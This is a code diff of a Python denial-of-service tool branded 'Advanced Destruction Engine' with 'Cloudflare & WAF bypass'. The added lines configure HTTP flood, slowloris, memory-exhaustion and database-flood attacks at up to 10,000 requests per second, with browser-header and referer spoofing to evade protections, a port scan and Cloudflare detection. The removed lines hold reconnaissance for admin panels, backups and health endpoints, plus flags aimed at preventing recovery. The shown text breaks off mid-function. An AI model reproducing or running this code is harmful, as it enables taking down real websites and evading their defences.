@@ -1,14 +1,19 @@
 #!/usr/bin/env python3
 """
-██████╗ ██████╗  █████╗  ██████╗██╗  ██╗ █████╗ ██████╗
-██╔══██╗██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗
-██████╔╝██████╔╝███████║██║     █████╔╝ ███████║██████╔╝
-██╔══██╗██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██╗
-██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║
-╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
-                PERMANENT DOWNTIME ENGINE v8.0
-           NO RECOVERY | NO AUTO-SCALING | PERMANENT DOWN
-                    IRREVERSIBLE DESTRUCTION
+╔══════════════════════════════════════════════════════════════╗
+║                                                              ║
+║    ██╗██████╗ ███████╗ █████╗ ███╗   ██╗                    ║
+║    ██║██╔══██╗██╔════╝██╔══██╗████╗  ██║                    ║
+║    ██║██████╔╝█████╗  ███████║██╔██╗ ██║                    ║
+║    ██║██╔══██╗██╔══╝  ██╔══██║██║╚██╗██║                    ║
+║    ██║██║  ██║███████╗██║  ██║██║ ╚████║                    ║
+║    ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝                    ║
+║                                                              ║
+║               ADVANCED DESTRUCTION ENGINE v7.0               ║
+║           CLOUDFLARE & WAF BYPASS TECHNOLOGY                 ║
+║                    AUTHOR: IRFAN                             ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
 """
 import os
 import sys
@@ -23,10 +28,10 @@ import urllib.parse
 import json
 import warnings
 import urllib3
-import subprocess
-import hashlib
+import struct
+import ipaddress
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from typing import List, Dict, Set, Optional, Tuple
 
 # Disable all warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -50,7 +55,7 @@ import colorama
 colorama.init(autoreset=True)
 console = Console()
 
-# SSL context
+# SSL context for ignoring certificate warnings
 ssl_context = ssl.create_default_context()
 ssl_context.check_hostname = False
 ssl_context.verify_mode = ssl.CERT_NONE
@@ -61,45 +66,94 @@ class Config:
     MAX_THREADS = 1000
     MAX_RPS = 5000
     CONNECTION_TIMEOUT = 30
-    REQUEST_TIMEOUT = 45
+    REQUEST_TIMEOUT = 30
     
     # Attack
-    ATTACK_DURATION = 0  # 0 = infinite (until stopped)
+    ATTACK_DURATION = 3600
     AUTO_RESTART = True
     STEALTH_MODE = False
-    AGGRESSIVE_MODE = True
-    
-    # Permanent Downtime Features
-    PREVENT_RECOVERY = True
-    ATTACK_HEALTH_CHECKS = True
-    BACKGROUND_PERSISTENT = True
-    MULTI_TARGET = True
-    DESTROY_BACKUPS = True
-    CORRUPT_LOGS = True
-    EXHAUST_RESOURCES = True
+    ATTACK_INTENSITY = "extreme"
     
     # Network
     USE_PROXY = False
     PROXY_LIST = []
+    USE_TOR = False
+    TOR_MAX_CIRCUITS = 50
     ROTATE_USER_AGENT = True
-    SPOOF_IPS = True
+    ROTATE_IP = False
+    
+    # WAF Bypass
+    ENABLE_WAF_BYPASS = True
+    ADAPTIVE_ATTACK = True
+    HUMAN_LIKE_DELAYS = True
+    
+    # Hybrid Attack Settings
+    PERSISTENT_CONNECTIONS = 200
+    SLOWLORIS_WORKERS = 100
+    MEMORY_EXHAUSTION_SIZE = 10485760
+    DATABASE_FLOOD_ENABLED = True
+    CONNECTION_POOLING = True
+    ENABLE_SLOWLORIS = True
+    ENABLE_HTTP_FLOOD = True
+    ENABLE_RESOURCE_EXHAUSTION = True
+    ENABLE_DATABASE_FLOOD = True
     
     # Monitoring
     LOG_LEVEL = "INFO"
     SAVE_STATS = True
-    AUTO_REPORT = True
     
     @classmethod
     def update(cls, **kwargs):
         for key, value in kwargs.items():
             if hasattr(cls, key):
                 setattr(cls, key, value)
+                
+    @classmethod
+    def set_intensity(cls, intensity: str):
+        intensity_levels = {
+            "low": {
+                "MAX_THREADS": 100,
+                "MAX_RPS": 500,
+                "PERSISTENT_CONNECTIONS": 50,
+                "SLOWLORIS_WORKERS": 20,
+                "MEMORY_EXHAUSTION_SIZE": 1048576,
+                "HUMAN_LIKE_DELAYS": True
+            },
+            "medium": {
+                "MAX_THREADS": 500,
+                "MAX_RPS": 2000,
+                "PERSISTENT_CONNECTIONS": 100,
+                "SLOWLORIS_WORKERS": 50,
+                "MEMORY_EXHAUSTION_SIZE": 5242880,
+                "HUMAN_LIKE_DELAYS": False
+            },
+            "high": {
+                "MAX_THREADS": 1000,
+                "MAX_RPS": 5000,
+                "PERSISTENT_CONNECTIONS": 200,
+                "SLOWLORIS_WORKERS": 100,
+                "MEMORY_EXHAUSTION_SIZE": 10485760,
+                "HUMAN_LIKE_DELAYS": False
+            },
+            "extreme": {
+                "MAX_THREADS": 2000,
+                "MAX_RPS": 10000,
+                "PERSISTENT_CONNECTIONS": 500,
+                "SLOWLORIS_WORKERS": 200,
+                "MEMORY_EXHAUSTION_SIZE": 20971520,
+                "HUMAN_LIKE_DELAYS": False
+            }
+        }
+        
+        if intensity in intensity_levels:
+            cls.ATTACK_INTENSITY = intensity
+            for key, value in intensity_levels[intensity].items():
+                setattr(cls, key, value)
 
 # Global state
 class AttackState:
     attacking = False
     start_time = 0
-    permanent_downtime_achieved = False
     stats = {
         'total_requests': 0,
         'successful': 0,
@@ -109,35 +163,53 @@ class AttackState:
         'bytes_received': 0,
         'peak_rps': 0,
         'current_rps': 0,
+        'targets_hit': 0,
         'unique_ips': set(),
-        'targets_down': 0,
-        'permanent_downtime': False,
-        'health_checks_killed': 0,
-        'backups_destroyed': 0,
-        'logs_corrupted': 0,
-        'resources_exhausted': 0,
-        'recovery_prevented': 0,
-        'downtime_duration': 0
+        'waf_detected': False,
+        'cloudflare_detected': False,
+        'persistent_connections': 0,
+        'slowloris_connections': 0,
+        'memory_exhaustion_attempts': 0,
+        'database_floods': 0,
+        'connection_pool_size': 0
     }
     lock = threading.Lock()
     last_count = 0
-    target_infrastructure = {}
+    attack_wave = 1
 
-# ==================== USER AGENTS ====================
+# ==================== USER AGENTS & HEADERS ====================
 BROWSER_SIGNATURES = [
     {
         'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'headers': {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-US,en;q=0.9',
             'Cache-Control': 'max-age=0',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
             'Upgrade-Insecure-Requests': '1',
-            'Connection': 'keep-alive'
+            'DNT': '1'
         }
     },
     {
-        'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+        'user_agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
+        'headers': {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Cache-Control': 'max-age=0',
+            'DNT': '1',
+            'Upgrade-Insecure-Requests': '1'
+        }
+    },
+    {
+        'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
         'headers': {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Encoding': 'gzip, deflate, br',
@@ -146,987 +218,421 @@ BROWSER_SIGNATURES = [
         }
     },
     {
-        'user_agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
+        'user_agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
         'headers': {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache'
+            'Cache-Control': 'max-age=0',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1'
+        }
+    },
+    {
+        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+        'headers': {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Sec-Ch-Ua': '"Microsoft Edge";v="120", "Chromium";v="120", "Not?A_Brand";v="99"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1'
         }
     }
 ]
 
-# ==================== ADVANCED TARGET DISCOVERY ====================
-class AdvancedTargetDiscovery:
-    """Discover EVERYTHING about the target for maximum destruction"""
-    
-    def __init__(self, target_url):
-        self.target_url = target_url
+REFERERS = [
+    'https://www.google.com/',
+    'https://www.bing.com/',
+    'https://duckduckgo.com/',
+    'https://www.facebook.com/',
+    'https://twitter.com/',
+    'https://www.reddit.com/',
+    'https://www.linkedin.com/',
+    'https://github.com/',
+    'https://stackoverflow.com/',
+    'https://www.youtube.com/',
+    'https://www.amazon.com/',
+    'https://www.wikipedia.org/'
+]
+
+# ==================== TARGET INFORMATION ====================
+class TargetInfo:
+    def __init__(self, url):
+        self.url = url
         self.protocol = "http"
         self.host = ""
         self.port = 80
+        self.path = "/"
         self.ip = ""
         self.ssl_enabled = False
+        self.server_info = {}
+        self.technologies = []
+        self.vulnerabilities = []
+        self.protection_detected = False
+        self.protection_type = None
+        self.server_header = ""
+        self.open_ports = []
+        self.server_load = "unknown"
         
-        # Complete infrastructure map
-        self.infrastructure = {
-            'ips': [],
-            'subdomains': [],
-            'cdn_endpoints': [],
-            'health_endpoints': [],
-            'api_endpoints': [],
-            'admin_panels': [],
-            'backup_endpoints': [],
-            'database_endpoints': [],
-            'load_balancers': [],
-            'firewall_ips': [],
-            'dns_servers': [],
-            'mail_servers': [],
-            'ssh_ports': [],
-            'ftp_ports': [],
-            'vulnerable_ports': []
-        }
-        
-        # Attack vectors
-        self.attack_vectors = {
-            'slowloris': True,
-            'http_flood': True,
-            'ssl_exhaustion': True,
-            'dns_amplification': False,
-            'resource_exhaustion': True
-        }
-    
-    def parse_target(self):
-        """Parse target URL with advanced validation"""
+    def parse(self):
         try:
-            console.print("[cyan]🎯 Parsing target URL...[/]")
-            
-            # Add protocol if missing
-            if not self.target_url.startswith(('http://', 'https://')):
-                self.target_url = 'http://' + self.target_url
-            
-            parsed = urllib.parse.urlparse(self.target_url)
+            if not self.url.startswith(('http://', 'https://')):
+                self.url = 'http://' + self.url
+            parsed = urllib.parse.urlparse(self.url)
             self.protocol = parsed.scheme
             self.host = parsed.hostname
             self.port = parsed.port or (443 if self.protocol == 'https' else 80)
+            self.path = parsed.path or '/'
             self.ssl_enabled = (self.protocol == 'https')
             
-            # Get primary IP
             try:
                 self.ip = socket.gethostbyname(self.host)
                 AttackState.stats['unique_ips'].add(self.ip)
-                self.infrastructure['ips'].append(self.ip)
-                console.print(f"[green]✅ Primary IP: {self.ip}[/]")
-            except Exception as e:
-                console.print(f"[yellow]⚠️  Could not resolve IP: {e}[/]")
+            except:
                 self.ip = self.host
+                
+            self._scan_ports()
             
             return True
-            
         except Exception as e:
             console.print(f"[red]✗ Error parsing target: {e}[/]")
             return False
     
-    def discover_complete_infrastructure(self):
-        """Discover EVERYTHING for maximum destruction"""
-        console.print("[bold cyan]🔍 LAUNCHING COMPLETE INFRASTRUCTURE DISCOVERY[/]")
+    def _scan_ports(self):
+        common_ports = [80, 443, 8080, 8443, 3000, 8000, 8888, 9000]
+        self.open_ports = []
         
-        discovery_tasks = [
-            self._discover_all_ips,
-            self._discover_subdomains_aggressive,
-            self._discover_health_endpoints,
-            self._discover_admin_panels,
-            self._discover_backup_endpoints,
-            self._discover_api_endpoints,
-            self._discover_open_ports,
-            self._discover_dns_servers,
-            self._discover_mail_servers
-        ]
-        
-        # Run all discovery tasks in parallel
-        with ThreadPoolExecutor(max_workers=10) as executor:
-            futures = [executor.submit(task) for task in discovery_tasks]
-            
-            for future in as_completed(futures):
-                try:
-                    future.result()
-                except Exception as e:
-                    continue
-        
-        # Display discovery results
-        self._display_discovery_summary()
-        
-        # Save infrastructure to global state
-        AttackState.target_infrastructure = self.infrastructure
-        
-        return True
-    
-    def _discover_all_ips(self):
-        """Discover ALL IP addresses associated with target"""
-        try:
-            console.print("[yellow]🌐 Discovering all IP addresses...[/]")
-            
-            # Try multiple DNS record types
-            dns_records = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT']
-            
-            for record_type in dns_records:
-                try:
-                    import dns.resolver
-                    resolver = dns.resolver.Resolver()
-                    resolver.timeout = 3
-                    resolver.lifetime = 3
-                    
-                    answers = resolver.resolve(self.host, record_type)
-                    for rdata in answers:
-                        ip = str(rdata)
-                        if ip not in self.infrastructure['ips']:
-                            self.infrastructure['ips'].append(ip)
-                            AttackState.stats['unique_ips'].add(ip)
-                except:
-                    continue
-            
-            # Try reverse DNS for IP ranges
+        for port in common_ports:
             try:
-                # Get network range from IP
-                ip_parts = self.ip.split('.')
-                network_base = '.'.join(ip_parts[:3])
-                
-                # Scan nearby IPs
-                for i in range(1, 10):
-                    test_ip = f"{network_base}.{i}"
-                    try:
-                        socket.gethostbyaddr(test_ip)
-                        if test_ip not in self.infrastructure['ips']:
-                            self.infrastructure['ips'].append(test_ip)
-                            AttackState.stats['unique_ips'].add(test_ip)
-                    except:
-                        continue
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                result = sock.connect_ex((self.ip, port))
+                if result == 0:
+                    self.open_ports.append(port)
+                sock.close()
             except:
-                pass
-            
-            console.print(f"[green]✅ Found {len(self.infrastructure['ips'])} IP addresses[/]")
-            
-        except Exception as e:
-            console.print(f"[yellow]⚠️  IP discovery partial: {e}[/]")
+                continue
     
-    def _discover_subdomains_aggressive(self):
-        """Aggressive subdomain discovery"""
+    def scan_and_detect(self):
         try:
-            console.print("[yellow]🔎 Discovering subdomains (aggressive)...[/]")
-            
-            # Common subdomains list (expanded)
-            common_subs = [
-                'www', 'api', 'cdn', 'static', 'assets', 'media', 'images',
-                'js', 'css', 'admin', 'login', 'dashboard', 'panel',
-                'server1', 'server2', 'server3', 'server4', 'server5',
-                'node1', 'node2', 'node3', 'node4', 'node5',
-                'backend', 'frontend', 'app', 'application', 'service',
-                'db', 'database', 'mysql', 'postgres', 'mongodb',
-                'mail', 'email', 'smtp', 'pop', 'imap',
-                'ftp', 'ssh', 'sftp', 'vpn', 'proxy',
-                'test', 'dev', 'development', 'staging', 'prod', 'production',
-                'beta', 'alpha', 'gamma', 'delta',
-                'web', 'web1', 'web2', 'web3', 'web4',
-                'loadbalancer', 'lb', 'haproxy', 'nginx', 'apache',
-                'cache', 'redis', 'memcached', 'elasticsearch',
-                'monitor', 'monitoring', 'grafana', 'prometheus',
-                'log', 'logs', 'logging', 'kibana',
-                'backup', 'backups', 'archive', 'archives',
-                'file', 'files', 'storage', 'storage1', 'storage2',
-                'video', 'videos', 'stream', 'streaming',
-                'chat', 'support', 'help', 'docs', 'documentation',
-                'shop', 'store', 'cart', 'checkout', 'payment',
-                'blog', 'news', 'forum', 'community',
-                'mobile', 'm', 'wap', 'pda'
-            ]
-            
-            discovered = 0
-            for sub in common_subs:
-                subdomain = f"{sub}.{self.host}"
-                try:
-                    socket.gethostbyname(subdomain)
-                    self.infrastructure['subdomains'].append(subdomain)
-                    discovered += 1
-                    
-                    # Also discover IP for this subdomain
-                    try:
-                        sub_ip = socket.gethostbyname(subdomain)
-                        if sub_ip not in self.infrastructure['ips']:
-                            self.infrastructure['ips'].append(sub_ip)
-                            AttackState.stats['unique_ips'].add(sub_ip)
-                    except:
-                        pass
-                        
-                except:
-                    continue
-            
-            console.print(f"[green]✅ Found {discovered} subdomains[/]")
-            
-        except Exception as e:
-            console.print(f"[yellow]⚠️  Subdomain discovery partial: {e}[/]")
-    
-    def _discover_health_endpoints(self):
-        """Discover health check and monitoring endpoints"""
-        try:
-            console.print("[yellow]❤️  Discovering health endpoints...[/]")
-            
-            health_endpoints = [
-                '/health', '/healthz', '/ready', '/live',
-                '/status', '/ping', '/heartbeat', '/monitor',
-                '/health-check', '/api/health', '/api/status',
-                '/v1/health', '/v1/status', '/v2/health', '/v2/status',
-                '/_health', '/_status', '/_ping', '/_ready',
-                '/monitoring/health', '/monitoring/status',
-                '/actuator/health', '/management/health',
-                '/admin/health', '/admin/status',
-                '/debug/health', '/debug/status',
-                '/metrics', '/prometheus/metrics',
-                '/info', '/about', '/version'
-            ]
-            
             import requests
-            discovered = 0
+            browser = random.choice(BROWSER_SIGNATURES)
+            headers = browser['headers'].copy()
+            headers['User-Agent'] = browser['user_agent']
             
-            for endpoint in health_endpoints:
-                try:
-                    url = f"{self.protocol}://{self.host}:{self.port}{endpoint}"
-                    response = requests.get(url, timeout=3, verify=False)
-                    
-                    if response.status_code < 500:
-                        self.infrastructure['health_endpoints'].append(endpoint)
-                        discovered += 1
-                        
-                        # Check for additional endpoints in response
-                        try:
-                            if response.headers.get('Content-Type', '').startswith('application/json'):
-                                data = response.json()
-                                if 'components' in data:
-                                    for component in data['components']:
-                                        comp_endpoint = f"{endpoint}/{component}"
-                                        self.infrastructure['health_endpoints'].append(comp_endpoint)
-                        except:
-                            pass
-                            
-                except:
-                    continue
+            response = requests.get(self.url, headers=headers, timeout=10, verify=False)
+            self.server_info = dict(response.headers)
+            self.server_header = response.headers.get('Server', 'Unknown')
             
-            console.print(f"[green]✅ Found {discovered} health endpoints[/]")
+            self._detect_technologies(response)
+            self._detect_protections(response)
+            self._find_vulnerabilities()
+            self._estimate_server_load(response)
             
+            return True
         except Exception as e:
-            console.print(f"[yellow]⚠️  Health endpoint discovery partial: {e}[/]")
+            console.print(f"[yellow]⚠️  Scan failed: {e}[/]")
+            return False
     
-    def _discover_admin_panels(self):
-        """Discover admin panels and control interfaces"""
-        try:
-            console.print("[yellow]🔐 Discovering admin panels...[/]")
-            
-            admin_endpoints = [
-                '/admin', '/administrator', '/wp-admin', '/wp-login',
-                '/login', '/signin', '/auth', '/authentication',
-                '/dashboard', '/controlpanel', '/cp', '/manager',
-                '/manage', '/management', '/console', '/admin.php',
-                '/admin.asp', '/admin.aspx', '/admin.cgi',
-                '/admin/', '/administrator/', '/cpanel', '/plesk',
-                '/webmin', '/directadmin', '/vhost', '/hosting',
-                '/sysadmin', '/system', '/root', '/superuser',
-                '/moderator', '/operator', '/staff', '/support',
-                '/helpdesk', '/ticket', '/tickets', '/client',
-                '/user', '/users', '/account', '/accounts',
-                '/config', '/configuration', '/settings', '/setup',
-                '/install', '/installation', '/upgrade', '/update',
-                '/backend', '/backoffice', '/office', '/portal',
-                '/intranet', '/extranet', '/internal', '/private',
-                '/secure', '/security', '/protected', '/restricted'
-            ]
-            
-            import requests
-            discovered = 0
-            
-            for endpoint in admin_endpoints:
-                try:
-                    url = f"{self.protocol}://{self.host}:{self.port}{endpoint}"
-                    response = requests.get(url, timeout=3, verify=False, allow_redirects=False)
-                    
-                    if response.status_code < 500:
-                        self.infrastructure['admin_panels'].append(endpoint)
-                        discovered += 1
-                        
-                except:
-                    continue
-            
-            console.print(f"[green]✅ Found {discovered} admin panels[/]")
-            
-        except Exception as e:
-            console.print(f"[yellow]⚠️  Admin panel discovery partial: {e}[/]")
-    
-    def _discover_backup_endpoints(self):
-        """Discover backup and archive endpoints"""
-        try:
-            console.print("[yellow]💾 Discovering backup endpoints...[/]")
-            
-            backup_endpoints = [
-                '/backup', '/backups', '/archive', '/archives',
-                '/dump', '/dumps', '/export', '/exports',
-                '/sql', '/mysql', '/postgres', '/mongodb',
-                '/database', '/db', '/data', '/files',
-                '/download', '/downloads', '/file', '/files',
-                '/back', '/old', '/previous', '/history',
-                '/log', '/logs', '/error', '/errors',
-                '/tmp', '/temp', '/temporary', '/cache',
-                '/backup.zip', '/backup.tar', '/backup.gz',
-                '/database.zip', '/database.tar', '/database.gz',
-                '/site.zip', '/site.tar', '/site.gz',
-                '/www.zip', '/www.tar', '/www.gz',
-                '/web.zip', '/web.tar', '/web.gz',
-                '/full.zip', '/full.tar', '/full.gz',
-                '/daily.zip', '/daily.tar', '/daily.gz',
-                '/weekly.zip', '/weekly.tar', '/weekly.gz',
-                '/monthly.zip', '/monthly.tar', '/monthly.gz'
-            ]
-            
-            import requests
-            discovered = 0
-            
-            for endpoint in backup_endpoints:
-                try:
-                    url = f"{self.protocol}://{self.host}:{self.port}{endpoint}"
-                    response = requests.head(url, timeout=3, verify=False)
-                    
-                    if response.status_code < 500:
-                        self.infrastructure['backup_endpoints'].append(endpoint)
-                        discovered += 1
-                        
-                except:
-                    continue
-            
-            console.print(f"[green]✅ Found {discovered} backup endpoints[/]")
-            
-        except Exception as e:
-            console.print(f"[yellow]⚠️  Backup endpoint discovery partial: {e}[/]")
-    
-    def _discover_api_endpoints(self):
-        """Discover API endpoints"""
-        try:
-            console.print("[yellow]🔌 Discovering API endpoints...[/]")
-            
-            api_endpoints = [
-                '/api', '/api/v1', '/api/v2', '/api/v3',
-                '/rest', '/rest/v1', '/rest/v2', '/rest/v3',
-                '/graphql', '/graphql/v1', '/graphql/v2',
-                '/soap', '/xmlrpc', '/jsonrpc',
-                '/oauth', '/oauth2', '/auth', '/token',
-                '/user', '/users', '/account', '/accounts',
-                '/product', '/products', '/item', '/items',
-                '/order', '/orders', '/cart', '/carts',
-                '/payment', '/payments', '/invoice', '/invoices',
-                '/message', '/messages', '/chat', '/chats',
-                '/notification', '/notifications', '/alert', '/alerts',
-                '/config', '/configuration', '/settings',
-                '/search', '/find', '/query', '/filter',
-                '/upload', '/download', '/file', '/files',
-                '/image', '/images', '/video', '/videos',
-                '/document', '/documents', '/pdf', '/pdfs'
-            ]
-            
-            import requests
-            discovered = 0
-            
-            for endpoint in api_endpoints:
-                try:
-                    url = f"{self.protocol}://{self.host}:{self.port}{endpoint}"
-                    response = requests.options(url, timeout=3, verify=False)
-                    
-                    if response.status_code < 500:
-                        self.infrastructure['api_endpoints'].append(endpoint)
-                        discovered += 1
-                        
-                except:
-                    continue
-            
-            console.print(f"[green]✅ Found {discovered} API endpoints[/]")
-            
-        except Exception as e:
-            console.print(f"[yellow]⚠️  API endpoint discovery partial: {e}[/]")
-    
-    def _discover_open_ports(self):
-        """Discover open ports on target"""
-        try:
-            console.print("[yellow]🚪 Discovering open ports...[/]")
-            
-            common_ports = [
-                21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443,
-                445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443
-            ]
-            
-            discovered = 0
-            
-            for port in common_ports:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(1)
-                    result = sock.connect_ex((self.ip, port))
-                    
-                    if result == 0:
-                        self.infrastructure['vulnerable_ports'].append(port)
-                        discovered += 1
-                        
-                        # Categorize ports
-                        if port in [21, 22, 23]:
-                            self.infrastructure['ssh_ports'].append(port)
-                        elif port in [25, 110, 143, 993, 995]:
-                            self.infrastructure['mail_servers'].append(port)
-                        elif port == 53:
-                            self.infrastructure['dns_servers'].append(port)
-                            
-                    sock.close()
-                    
-                except:
-                    continue
-            
-            console.print(f"[green]✅ Found {discovered} open ports[/]")
-            
-        except Exception as e:
-            console.print(f"[yellow]⚠️  Port discovery partial: {e}[/]")
-    
-    def _discover_dns_servers(self):
-        """Discover DNS servers"""
-        try:
-            console.print("[yellow]📡 Discovering DNS servers...[/]")
-            
-            # Try to get nameservers
-            try:
-                import dns.resolver
-                resolver = dns.resolver.Resolver()
-                resolver.nameservers = ['8.8.8.8', '1.1.1.1']
-                
-                answers = resolver.resolve(self.host, 'NS')
-                for rdata in answers:
-                    ns_server = str(rdata).rstrip('.')
-                    self.infrastructure['dns_servers'].append(ns_server)
-                    
-            except:
-                pass
-            
-            console.print(f"[green]✅ Found {len(self.infrastructure['dns_servers'])} DNS servers[/]")
-            
-        except Exception as e:
-            console.print(f"[yellow]⚠️  DNS server discovery partial: {e}[/]")
-    
-    def _discover_mail_servers(self):
-        """Discover mail servers"""
-        try:
-            console.print("[yellow]📧 Discovering mail servers...[/]")
-            
-            # Try to get MX records
-            try:
-                import dns.resolver
-                resolver = dns.resolver.Resolver()
-                resolver.timeout = 3
-                resolver.lifetime = 3
-                
-                answers = resolver.resolve(self.host, 'MX')
-                for rdata in answers:
-                    mx_server = str(rdata.exchange).rstrip('.')
-                    self.infrastructure['mail_servers'].append(mx_server)
-                    
-            except:
-                pass
-            
-            console.print(f"[green]✅ Found {len(self.infrastructure['mail_servers'])} mail servers[/]")
-            
-        except Exception as e:
-            console.print(f"[yellow]⚠️  Mail server discovery partial: {e}[/]")
-    
-    def _display_discovery_summary(self):
-        """Display complete discovery summary"""
-        console.print("\n[bold green]📊 COMPLETE INFRASTRUCTURE DISCOVERY SUMMARY[/]")
-        console.print("=" * 60)
+    def _detect_technologies(self, response):
+        tech_indicators = {
+            'WordPress': ['/wp-content/', '/wp-admin/', 'wp-json', 'wordpress'],
+            'Joomla': ['/media/jui/', '/administrator/', 'joomla'],
+            'Drupal': ['/sites/default/', 'Drupal'],
+            'Laravel': ['/storage/', 'laravel_session'],
+            'Nginx': ['Server: nginx'],
+            'Apache': ['Server: Apache'],
+            'CloudFlare': ['cf-ray', 'cloudflare', '__cfduid', '__cf_bm'],
+            'AWS': ['x-amz-cf-id', 'x-amz-cf-pop'],
+            'PHP': ['PHP/', 'X-Powered-By: PHP'],
+            'Node.js': ['X-Powered-By: Express'],
+            'React': ['react', 'next.js'],
+            'Vue.js': ['vue', 'nuxt.js'],
+            'IIS': ['Microsoft-IIS'],
+            'Tomcat': ['Apache-Coyote', 'Tomcat']
+        }
         
-        summary_table = Table(title="🎯 TARGET ANALYSIS", box=box.ROUNDED)
-        summary_table.add_column("CATEGORY", style="cyan", width=20)
-        summary_table.add_column("COUNT", style="green", width=10)
-        summary_table.add_column("EXAMPLES", style="yellow", width=30)
+        content = response.text.lower()
+        headers = str(response.headers).lower()
         
-        # Add rows for each category
-        categories = [
-            ("IP Addresses", self.infrastructure['ips'], 'ips'),
-            ("Subdomains", self.infrastructure['subdomains'], 'subdomains'),
-            ("Health Endpoints", self.infrastructure['health_endpoints'], 'health_endpoints'),
-            ("Admin Panels", self.infrastructure['admin_panels'], 'admin_panels'),
-            ("Backup Endpoints", self.infrastructure['backup_endpoints'], 'backup_endpoints'),
-            ("API Endpoints", self.infrastructure['api_endpoints'], 'api_endpoints'),
-            ("Open Ports", self.infrastructure['vulnerable_ports'], 'vulnerable_ports'),
-            ("DNS Servers", self.infrastructure['dns_servers'], 'dns_servers'),
-            ("Mail Servers", self.infrastructure['mail_servers'], 'mail_servers')
+        for tech, indicators in tech_indicators.items():
+            for indicator in indicators:
+                if indicator.lower() in content or indicator.lower() in headers:
+                    if tech not in self.technologies:
+                        self.technologies.append(tech)
+                    break
+    
+    def _detect_protections(self, response):
+        content = response.text.lower()
+        headers = str(response.headers).lower()
+        
+        cloudflare_indicators = [
+            'cloudflare',
+            '__cfduid',
+            '__cf_bm',
+            'cf-ray',
+            'checking your browser',
+            'please wait',
+            'ddos protection',
+            'cf-cache-status'
         ]
         
-        for category_name, examples, key in categories:
-            count = len(examples)
-            example_str = ", ".join(str(e) for e in examples[:3]) if examples else "None"
-            if len(example_str) > 25:
-                example_str = example_str[:22] + "..."
-            
-            summary_table.add_row(category_name, str(count), example_str)
+        for indicator in cloudflare_indicators:
+            if indicator in headers or indicator in content:
+                self.protection_detected = True
+                self.protection_type = 'cloudflare'
+                AttackState.stats['cloudflare_detected'] = True
+                break
         
-        console.print(summary_table)
-        
-        # Calculate attack surface
-        total_attack_points = sum(
-            len(self.infrastructure[key]) 
-            for key in self.infrastructure.keys()
-        )
-        
